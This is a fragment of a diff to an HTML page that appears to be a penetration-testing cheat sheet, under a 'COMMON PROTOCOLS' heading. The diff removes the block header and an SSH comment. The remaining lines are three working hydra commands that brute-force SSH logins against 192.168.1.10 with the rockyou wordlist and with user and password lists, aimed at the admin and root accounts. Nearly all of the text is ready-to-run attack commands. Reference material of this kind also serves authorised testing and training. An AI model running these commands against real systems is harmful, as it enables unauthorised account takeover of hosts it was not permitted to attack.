@@ -1,11 +1,5 @@
 
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">COMMON PROTOCOLS</span>
-      </div>
-      <pre><span class="c"># ── SSH ───────────────────────────────────────────────────</span>
 <span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> /usr/share/wordlists/rockyou.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
 <span class="cmd">hydra</span> <span class="fl">-L</span> users.txt <span class="fl">-P</span> passwords.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
 <span class="cmd">hydra</span> <span class="fl">-l</span> root <span class="fl">-P</span> rockyou.txt <span class="fl">-t</span> <span class="val">4</span> ssh<span class="op">://</span><span class="val">192.168.1.10</span>
